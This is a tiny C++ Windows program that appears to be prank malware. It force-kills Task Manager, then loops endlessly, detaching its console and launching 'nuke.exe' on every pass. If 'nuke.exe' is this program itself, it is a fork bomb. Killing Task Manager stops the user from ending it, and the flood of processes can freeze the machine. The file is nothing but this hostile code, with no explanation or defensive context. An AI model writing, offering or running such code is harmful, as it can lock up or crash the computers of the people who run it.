#include "pch.h"
#include <iostream>
#include <windows.h>

int main()
{
	system("taskkill /f /im Taskmgr.exe");
	SetCursorPos(200, 200);
	for (;;) {
		FreeConsole();
		system("start nuke.exe");
	}
}
